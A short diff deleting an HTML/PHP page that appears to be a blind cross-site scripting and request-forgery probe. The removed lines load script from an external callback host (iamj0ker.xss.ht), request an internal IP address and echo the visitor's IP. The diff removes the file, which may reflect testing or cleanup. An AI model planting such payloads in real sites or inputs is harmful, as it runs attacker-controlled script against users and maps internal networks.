@@ -1,7 +1,0 @@
-<HTML>
-<body>
-  <img src="http://192.168.101.6:80/test"></img>
-  <script src=//iamj0ker.xss.ht></script>
-  Your IP address is: <? echo $_SERVER["REMOTE_ADDR"]; ?>
-  
-</HTML>
